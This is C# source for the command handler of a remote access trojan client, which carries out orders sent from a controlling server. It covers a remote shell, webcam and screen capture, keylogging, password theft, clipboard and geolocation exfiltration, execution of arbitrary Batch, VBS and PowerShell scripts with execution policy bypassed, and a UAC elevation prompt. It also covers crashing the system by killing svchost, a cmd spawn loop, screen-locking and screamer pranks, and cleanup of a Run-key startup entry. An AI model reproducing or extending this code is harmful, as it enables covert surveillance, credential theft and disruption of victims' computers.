using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Client.Connection;
using Microsoft.Win32;
using System.Windows.Forms;
using Stuff;
using System.Runtime.InteropServices;
using System.Text;
using NAudio.Wave;
using System.Drawing.Imaging;
using System.Drawing;
using Client.Things;
using System.Device.Location;
using System.Threading.Tasks;

namespace Client.Handlers
{
    internal class HandlePacket
    {
        static Form2 aaa = null;
        static Form3 aaa2 = null;
        static bool aaa3;
        static bool aaa4;
        static bool aaa5;

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")]
        private static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
                                      IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int height);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);

        [DllImport("user32.dll")]
        public static extern int SendMessageA(IntPtr hWnd, int Msg, int wParam, int lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        const int WM_APPCOMMAND = 0x319;
        const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        public const byte VK_CAPITAL = 0x14;
        public const uint KEYEVENTF_KEYDOWN = 0x0000;
        public const uint KEYEVENTF_KEYUP = 0x0002;

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern void ReleaseDC(IntPtr hWnd, IntPtr hdc);

        private const uint SRCAND = 0x008800C6;
        const int NOTSRCCOPY = 0x00330008;
        private const int SRCCOPY = 0x00CC0020;

        private string UptimeUpdated()
        {
            TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
            return uptime.ToString(@"hh\:mm\:ss");
        }

        public static void ToggleCapsLock()
    {
            keybd_event(VK_CAPITAL, 0, KEYEVENTF_KEYDOWN, 0);
            keybd_event(VK_CAPITAL, 0, KEYEVENTF_KEYUP, 0);
    }
        public byte[] packet { get; set; }
        public void Run(object state)
        {
            if (packet == null) return;
            Stuff.Unpack unpack = new Stuff.Unpack();
            unpack.Unpacc(packet);
            switch (unpack.GetAsString("Packet"))
            {
                case "Clientinfo":
                    {
                        new HandleInfo();
                        break;
                    }
                case "Ping":
                    {
                        Thread.Sleep(1500);
                        Pack pack = new Stuff.Pack();
                        pack.Set("Packet", "Ping");
                        pack.Set("Message", "From client");
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "StartShell":
                    {
                        HandleShell.StartShell();
                        break;
                    }
                case "Shell":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Shell session started");
                        SillyClient.Send(pack1.Pacc());
                        HandleShell.CmdShell(unpack.GetAsString("Command"));
                        break;
                    }
                case "StopShell":
                    {
                        HandleShell.StopShell();
                        break;
                    }
                case "Webcam":
                    {
                        Handlewebcam.Instance.Start(unpack.GetAsInteger("Cam"));
                        break;
                    }
                case "StopWebcam":
                    {
                        Handlewebcam.Instance.Stop();
                        break;
                    }
                case "GetWebcams":
                    {
                        new Handlewebcam().SendCameraList();
                        break;
                    }
                case "ProcessSpy":
                    {
                        new HandleProcessManager().Run(unpack);
                        break;
                    }
                case "Notepad":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Notepad received");
                        SillyClient.Send(pack1.Pacc());
                        string title = unpack.GetAsString("Title");
                        string content = unpack.GetAsString("Content");

                        string tempFile = Path.Combine(Path.GetTempPath(), title + "_" + Helpers.Random(3));

                        File.WriteAllText(tempFile, content);

                        Process notepadProcess = new Process();
                        notepadProcess.StartInfo.FileName = "notepad.exe";
                        notepadProcess.StartInfo.Arguments = tempFile;
                        notepadProcess.Start();
                        break;
                    }
                case "RemoteDesktop":
                    {
                        new HandleRemoteDesktop().Run(unpack);
                        break;
                    }
                case "Reverse":
                    {
                        HandleDirection.Reverse();
                        break;
                    }
                case "Normal":
                    {
                        HandleDirection.Normal();
                        break;
                    }

                case "Wallpaper":
                    {
                        string daimage = unpack.GetAsString("Image");
                        byte[] imageBytes = Convert.FromBase64String(daimage);

                        string wallpaperPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                                            "Microsoft\\Windows\\Themes\\wallpaper.jpg");
                        File.WriteAllBytes(wallpaperPath, imageBytes);
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Wallpaper set");
                        SillyClient.Send(pack1.Pacc());
                        SystemParametersInfo(0x0014, 0, wallpaperPath, 0x01 | 0x02);
                        break;
                    }
                case "Beep":
                    {
                        Console.Beep();
                        break;
                    }
                case "Caps":
                    {
                        ToggleCapsLock();
                        break;
                    }
                case "TrapMouse":
                    {
                        MouseHandler.Trap();
                        break;
                    }
                case "UntrapMouse":
                    {
                        MouseHandler.Untrap();
                        break;
                    }
                case "ShakeMouseStop":
                    {
                        MouseHandler.StopShake();
                        break;
                    }
                case "ShakeMouse":
                    {
                        MouseHandler.StartShake();
                        break;
                    }
                case "ShowTaskbar":
                    {
                        TaskbarHandler.ShowTaskbar();
                        break;
                    }
                case "HideTaskbar":
                    {
                        TaskbarHandler.HideTaskbar();
                        break;
                    }
                case "killexplorer":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c taskkill /f /IM explorer.exe",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "startexplorer":
                    {
                        Process.Start("explorer.exe");
                        break;
                    }
                case "Mute":
                    {
                        IntPtr hwnd = FindWindow("Shell_TrayWnd", null);
                        SendMessageA(hwnd, WM_APPCOMMAND, hwnd.ToInt32(), APPCOMMAND_VOLUME_MUTE);
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Mute toggled");
                        SillyClient.Send(pack1.Pacc());
                        break;
                    }
                case "Trollcmd":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "CMD Loop started");
                        SillyClient.Send(pack1.Pacc());
                        while (true)
                        {
                            Process.Start("cmd.exe", "/C pause");
                            Thread.Sleep(0);
                        }
                    }

                case "Request":
                    {
                        if (Defs.Check.Admin())
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", "You are already an admin!");
                            SillyClient.Send(pack.Pacc());
                            return;
                        }
                        try
                        {
                            Process proc = new Process
                            {
                                StartInfo = new ProcessStartInfo
                                {
                                    FileName = "cmd.exe",
                                    Arguments = "/k " + Application.ExecutablePath,
                                    WindowStyle = ProcessWindowStyle.Hidden,
                                    Verb = "runas",
                                    UseShellExecute = true
                                }
                            };
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "Request accepted");
                            SillyClient.Send(pack1.Pacc());
                            proc.Start();
                            Application.Exit();
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Website":
                    {
                        string url = unpack.GetAsString("URL");
                        Process.Start($"{url}");
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "URL Opened");
                        SillyClient.Send(pack1.Pacc());
                        break;
                    }
                case "PortSpy":
                    {
                        HandlePort.GetOpenPorts();
                        break;
                    }
                case "Keylogger":
                    {
                        HandleKeylogger.Start();
                        break;
                    }
                case "GetPassword":
                    {
                        try
                        {
                            StringBuilder stringBuilder = new StringBuilder();
                            HandlePass.Steal(stringBuilder);
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Manager":
                    {
                        new managerHandler(unpack);
                        break;
                    }
                case "Execute":
                    {
                        string type = unpack.GetAsString("Type");
                        string code = unpack.GetAsString("Code");

                        if (type == "Batch")
                        {
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "Batch Script executed");
                            SillyClient.Send(pack1.Pacc());
                            string batchFile = Path.GetTempPath() + "script_" + Helpers.Random(7) + ".bat";
                            File.WriteAllText(batchFile, code);
                            Process.Start(new ProcessStartInfo("cmd.exe", $"/c \"{batchFile}\"") { CreateNoWindow = true });
                        }

                        if (type == "VBS")
                        {
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "VBS Script executed");
                            SillyClient.Send(pack1.Pacc());
                            string vbsFile = Path.GetTempPath() + "script_" + Helpers.Random(7) + ".vbs";
                            File.WriteAllText(vbsFile, code);
                            Process.Start(new ProcessStartInfo("wscript.exe", vbsFile) { CreateNoWindow = true });
                        }

                        if (type == "Powershell")
                        {
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "PowerShell Script executed");
                            SillyClient.Send(pack1.Pacc());
                            string psFile = Path.GetTempPath() + "script_" + Helpers.Random(7) + ".ps1";
                            File.WriteAllText(psFile, code);
                            Process.Start(new ProcessStartInfo("powershell.exe", $"-ExecutionPolicy Bypass -File \"{psFile}\"") { CreateNoWindow = true });
                        }
                        break;
                    }

                case "BSOD":
                    {
                        try
                        {
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "Computer crashed");
                            SillyClient.Send(pack1.Pacc());
                            ProcessStartInfo processStartInfo = new ProcessStartInfo()
                            {
                                FileName = "taskkill",
                                Arguments = "/f /IM svchost.exe",
                                Verb = "runas",
                                UseShellExecute = true
                            };
                            Process.Start(processStartInfo);
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Upload":
                    {
                        new HandleUpload().Init(unpack);
                        break;
                    }
                case "HiddenBrowser":
                    {
                        break;
                    }
                case "PlayAudio":
                    {
                        try
                        {
                            byte[] audioBytes = unpack.GetAsByteArray("Audio");

                            string tempFilePath = Path.Combine(Path.GetTempPath(), "tempAudioFile_" + Helpers.Random(6) + ".mp3");
                            File.WriteAllBytes(tempFilePath, audioBytes);
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "Playing audio");
                            SillyClient.Send(pack1.Pacc());
                            using (var waveOut = new WaveOutEvent())
                            {
                                using (var mp3Reader = new Mp3FileReader(tempFilePath))
                                {
                                    waveOut.Init(mp3Reader);
                                    waveOut.Play();

                                    while (waveOut.PlaybackState == PlaybackState.Playing)
                                    {
                                        Thread.Sleep(100);
                                    }
                                }
                            }

                            File.Delete(tempFilePath);
                        }
                        catch (Exception ex)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", ex.Message);
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Screamer":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Screamer received");
                        SillyClient.Send(pack1.Pacc());
                        Thread lockThread = new Thread(() =>
                        {
                            Application.EnableVisualStyles();
                            Application.SetCompatibleTextRenderingDefault(false);
                            Application.Run(new Form4());
                        })
                        {
                            IsBackground = true
                        };
                        lockThread.Start();
                        break;
                    }
                case "MsgBox":
                    {
                        string message = unpack.GetAsString("Message");
                        string icon = unpack.GetAsString("Icon");
                        string options = unpack.GetAsString("Options");
                        string title = unpack.GetAsString("Title");

                        MessageBoxIcon msgIcon = MessageBoxIcon.None;
                        switch (icon)
                        {
                            case "Error":
                                msgIcon = MessageBoxIcon.Error;
                                break;
                            case "Warning":
                                msgIcon = MessageBoxIcon.Warning;
                                break;
                            case "Info":
                                msgIcon = MessageBoxIcon.Information;
                                break;
                        }

                        MessageBoxButtons msgButtons = MessageBoxButtons.OK;
                        switch (options)
                        {
                            case "OK":
                                msgButtons = MessageBoxButtons.OK;
                                break;
                            case "OK, Cancel":
                                msgButtons = MessageBoxButtons.OKCancel;
                                break;
                            case "Yes, No":
                                msgButtons = MessageBoxButtons.YesNo;
                                break;
                            case "Yes, No, Cancel":
                                msgButtons = MessageBoxButtons.YesNoCancel;
                                break;
                            case "Retry, Cancel":
                                msgButtons = MessageBoxButtons.RetryCancel;
                                break;
                            case "Abort, Retry, Ignore":
                                msgButtons = MessageBoxButtons.AbortRetryIgnore;
                                break;
                        }
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Message box sent");
                        SillyClient.Send(pack1.Pacc());
                        MessageBox.Show(message, title, msgButtons, msgIcon);
                        break;
                    }

                case "Lock":
                    {
                        if (aaa == null || aaa.IsDisposed)
                        {
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "Locked");
                            SillyClient.Send(pack1.Pacc());
                            aaa = new Form2();
                            Thread lockThread = new Thread(() =>
                            {
                                aaa.label1.Text = unpack.GetAsString("Text");
                                byte[] image = unpack.GetAsByteArray("Image");
                                Task.Run(() =>
                                {
                                    using (MemoryStream ms = new MemoryStream(image))
                                    {
                                        aaa.pictureBox1.BackgroundImage = Image.FromStream(ms);
                                    }
                                });
                                Application.EnableVisualStyles();
                                Application.SetCompatibleTextRenderingDefault(false);
                                Application.Run(aaa);
                            })
                            {
                                IsBackground = true
                            };
                            lockThread.Start();
                        }
                        break;
                    }

                case "Unlock":
                    {
                        if (aaa != null && !aaa.IsDisposed)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "PluginMessage");
                            pack.Set("Message", "Screen unlocked");
                            SillyClient.Send(pack.Pacc());

                            aaa.Invoke(new Action(() =>
                            {
                                aaa.Close();
                            }));
                            aaa = null;
                        }
                        else
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", "The screen is not locked, nice try...");
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }
                case "Chat":
                    {
                        if (aaa2 == null || aaa2.IsDisposed)
                        {
                            Pack pack1 = new Pack();
                            pack1.Set("Packet", "PluginMessage");
                            pack1.Set("Message", "Chat started");
                            SillyClient.Send(pack1.Pacc());

                            aaa2 = new Form3();

                            Thread lockThread = new Thread(() =>
                            {
                                Application.EnableVisualStyles();
                                Application.SetCompatibleTextRenderingDefault(false);
                                Application.Run(aaa2);
                            })
                            {
                                IsBackground = true
                            };
                            lockThread.Start();
                        }
                        break;
                    }

                case "CloseChat":
                    {
                        if (aaa2 != null && !aaa2.IsDisposed)
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "PluginMessage");
                            pack.Set("Message", "Chat closed");
                            SillyClient.Send(pack.Pacc());

                            aaa2.Invoke(new Action(() =>
                            {
                                aaa2.Close();
                            }));
                            aaa2 = null;
                        }
                        else
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", "The chat is not closed, nice try...");
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }


                case "ChatMessage":
                    {
                        if (aaa2 != null && !aaa2.IsDisposed)
                        {
                            byte[] img = unpack.GetAsByteArray("img");
                            Task.Run(() =>
                            {
                                using (MemoryStream ms = new MemoryStream(img))
                                {
                                    Image image = Image.FromStream(ms);
                                    aaa2.Invoke(new Action(() =>
                                    {
                                        aaa2.imageList1.Images.Add(image);
                                    }));
                                }
                            });
                            aaa2.BeginInvoke(new Action(() =>
                            {
                                ListViewItem meow = new ListViewItem(unpack.GetAsString("Message"));
                                meow.ImageIndex = 2;
                                aaa2.listView1.Items.Add(meow);
                            }));
                        }
                        else
                        {
                            Pack pack = new Pack();
                            pack.Set("Packet", "Error");
                            pack.Set("Error", "The chat is closed, nice try...");
                            SillyClient.Send(pack.Pacc());
                        }
                        break;
                    }

                case "GetClipboard":
                    {
                        string clipboardText = "";

                        Thread lockThread = new Thread(() =>
                        {
                            clipboardText = Clipboard.GetText();
                        })
                        {
                            IsBackground = true
                        };
                        lockThread.SetApartmentState(ApartmentState.STA);
                        lockThread.Start();
                        lockThread.Join();
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Clipboard text sent (" + clipboardText.Length + ")");
                        SillyClient.Send(pack1.Pacc());
                        Pack pack = new Pack();
                        pack.Set("Packet", "Clipboard");
                        pack.Set("UID", UID.Get());
                        pack.Set("Text", clipboardText);
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "Clipboard":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Clipboard text received");
                        SillyClient.Send(pack1.Pacc());

                        string tex = unpack.GetAsString("Text");

                        Thread lockThread = new Thread(() =>
                        {
                            Clipboard.SetText(tex);
                        })
                        {
                            IsBackground = true
                        };
                        lockThread.SetApartmentState(ApartmentState.STA); // This will let us access the clipboard
                        lockThread.Start();
                        break;
                    }

                case "Download":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Remote execution started");
                        SillyClient.Send(pack1.Pacc());
                        new HandleDownload(unpack);
                        break;
                    }

                case "Geo":
                    {
                        Pack pack2 = new Pack();
                        pack2.Set("Packet", "PluginMessage");
                        pack2.Set("Message", "Getting geolocation");
                        SillyClient.Send(pack2.Pacc());

                        CancellationTokenSource cts = new CancellationTokenSource();
                        Task.Run(() =>
                        {
                            using (GeoCoordinateWatcher watcher = new GeoCoordinateWatcher())
                            {
                                watcher.StatusChanged += (s, e) =>
                                {
                                    if (e.Status == GeoPositionStatus.Disabled)
                                    {
                                        Pack pack1 = new Pack();
                                        pack1.Set("Packet", "Error");
                                        pack1.Set("Error", "GPS Disabled: Returning IP geolocation");
                                        SillyClient.Send(pack1.Pacc());
                                        cts.Cancel();
                                    }
                                };

                                EventHandler<GeoPositionChangedEventArgs<GeoCoordinate>> positionChangedHandler = null;

                                positionChangedHandler = (s, e) =>
                                {
                                    double latitude = e.Position.Location.Latitude;
                                    double longitude = e.Position.Location.Longitude;

                                    string latString = latitude.ToString("G", System.Globalization.CultureInfo.InvariantCulture);
                                    string longString = longitude.ToString("G", System.Globalization.CultureInfo.InvariantCulture);

                                    Pack pack = new Pack();
                                    pack.Set("Packet", "Geo");
                                    pack.Set("UID", UID.Get());
                                    pack.Set("lat", latString);
                                    pack.Set("lon", longString);
                                    SillyClient.Send(pack.Pacc());

                                    watcher.PositionChanged -= positionChangedHandler;
                                    cts.Cancel();
                                };

                                watcher.PositionChanged += positionChangedHandler;
                                watcher.Start();

                                while (!cts.Token.IsCancellationRequested)
                                {
                                    Thread.Sleep(500);
                                }

                                watcher.Stop();
                            }
                        }, cts.Token);

                        break;
                    }

                case "Dark":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "GDI Effect started");
                        SillyClient.Send(pack1.Pacc());
                        aaa3 = true;
                        while (aaa3)
                        {
                            IntPtr hdc = GetDC(IntPtr.Zero);
                            int w = Screen.PrimaryScreen.Bounds.Width;
                            int h = Screen.PrimaryScreen.Bounds.Height;

                            Random rand = new Random();

                            Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
                            BitBlt(hdc, rand.Next() % 2, rand.Next() % 2, w, h, hdc, rand.Next() % 2, rand.Next() % 2, SRCAND);
                            Thread.Sleep(50);
                        }
                        break;
                    }

                case "Undark":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "GDI Effect stopped");
                        SillyClient.Send(pack1.Pacc());
                        aaa3 = false;
                        break;
                    }
                case "RC":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "GDI Effect started");
                        SillyClient.Send(pack1.Pacc());
                        aaa4 = true;
                        while (aaa4)
                        {
                            IntPtr desktopDC = GetDC(IntPtr.Zero);
                            if (desktopDC != IntPtr.Zero)
                            {
                                int width = Screen.PrimaryScreen.Bounds.Width;
                                int height = Screen.PrimaryScreen.Bounds.Height;
                                BitBlt(desktopDC, 0, 0, width, height, desktopDC, 0, 0, NOTSRCCOPY);
                                ReleaseDC(IntPtr.Zero, desktopDC);
                            }
                            Thread.Sleep(50);
                        }
                        break;
                    }

                case "URC":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "GDI Effect stopped");
                        SillyClient.Send(pack1.Pacc());
                        aaa4 = false;
                        break;
                    }

                case "LoopScreen":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "GDI Effect started");
                        SillyClient.Send(pack1.Pacc());
                        aaa5 = true;
                        while (aaa5)
                        {
                            IntPtr desktopDC = GetDC(IntPtr.Zero);
                            if (desktopDC != IntPtr.Zero)
                            {
                                IntPtr hdcMem = CreateCompatibleDC(desktopDC);
                                IntPtr hBitmap = CreateCompatibleBitmap(desktopDC, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                IntPtr oldBitmap = SelectObject(hdcMem, hBitmap);

                                BitBlt(hdcMem, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, desktopDC, 0, 0, SRCCOPY);

                                for (int i = 0; i < 10; i++)
                                {
                                    StretchBlt(desktopDC, i * 10, i * 10, Screen.PrimaryScreen.Bounds.Width - i * 20, Screen.PrimaryScreen.Bounds.Height - i * 20,
                                               hdcMem, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, SRCCOPY);
                                    Thread.Sleep(50);
                                }

                                SelectObject(hdcMem, oldBitmap);
                                DeleteObject(hBitmap);
                                DeleteDC(hdcMem);
                            }
                            Thread.Sleep(50);
                        }
                        break;
                    }

                case "UnLoopScreen":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "GDI Effect stopped");
                        SillyClient.Send(pack1.Pacc());
                        aaa5 = false;
                        break;
                    }

                case "Preview":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "Preview");
                        using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                        using (Graphics g = Graphics.FromImage(screenshot))
                        using (MemoryStream ms = new MemoryStream())
                        {
                            g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                            screenshot.Save(ms, ImageFormat.Jpeg);
                            pack.Set("Image", ms.ToArray());
                        }

                        pack.Set("Payload", Process.GetCurrentProcess().ProcessName + ".exe");
                        pack.Set("Startup", Things.Config.Startup);
                        pack.Set("Uptime", UptimeUpdated());
                        pack.Set("Ping", new System.Net.NetworkInformation.Ping().Send("8.8.8.8").RoundtripTime.ToString() + " ms");

                        string activeWindow = "N/A";
                        IntPtr handle = GetForegroundWindow();
                        if (handle != IntPtr.Zero)
                        {
                            StringBuilder windowText = new StringBuilder(256);
                            if (GetWindowText(handle, windowText, windowText.Capacity) > 0)
                            {
                                activeWindow = windowText.ToString();
                            }
                        }
                        pack.Set("Window", activeWindow);

                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "GetPing":
                    {
                        Pack pack2 = new Pack();
                        pack2.Set("Packet", "PluginMessage");
                        pack2.Set("Message", "Got the ping of 8.8.8.8");
                        SillyClient.Send(pack2.Pacc());
                        Pack pack = new Pack();
                        pack.Set("Packet", "GetPing");
                        pack.Set("Ping", new System.Net.NetworkInformation.Ping().Send("8.8.8.8").RoundtripTime.ToString() + " ms");
                        SillyClient.Send(pack.Pacc());
                        break;
                    }

                // Power
                case "Shutdown":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "PluginMessage");
                        pack.Set("Message", "Shutdown in progress");
                        SillyClient.Send(pack.Pacc());
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /s /f /t 00",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "LogOff":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "PluginMessage");
                        pack.Set("Message", "Log off in progress");
                        SillyClient.Send(pack.Pacc());
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /l /f",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "Disconnect":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "PluginMessage");
                        pack.Set("Message", "Disconnected");
                        SillyClient.Send(pack.Pacc());
                        Environment.Exit(0);
                        break;
                    }
                case "Restart":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "PluginMessage");
                        pack.Set("Message", "Restart in progress");
                        SillyClient.Send(pack.Pacc());
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /r /f /t 0",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "Kill":
                    {
                        Pack pack1 = new Pack();
                        pack1.Set("Packet", "PluginMessage");
                        pack1.Set("Message", "Removing configurations & files");

                        SillyClient.Send(pack1.Pacc());
                        if (Things.Config.Startup)
                        {
                            var registrykey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);
                            registrykey.DeleteValue(Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location));
                            registrykey.Close();
                        }
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("timeout 3 > NUL");
                            sw.WriteLine("CD " + Application.StartupPath);
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Pack pack = new Pack();
                        pack.Set("Packet", "Error");
                        pack.Set("Packet", "The program was deleted from the client");
                        Environment.Exit(0);
                        break;
                    }
                case "Update":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "PluginMessage");
                        pack.Set("Message", "Refreshing client...");
                        SillyClient.Send(pack.Pacc());
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("timeout 3 > NUL");
                            sw.WriteLine("START " + "\"" + "\" " + "\"" + Application.ExecutablePath + "\"");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(0);
                        break;
                    }
            }

        }
    }
}
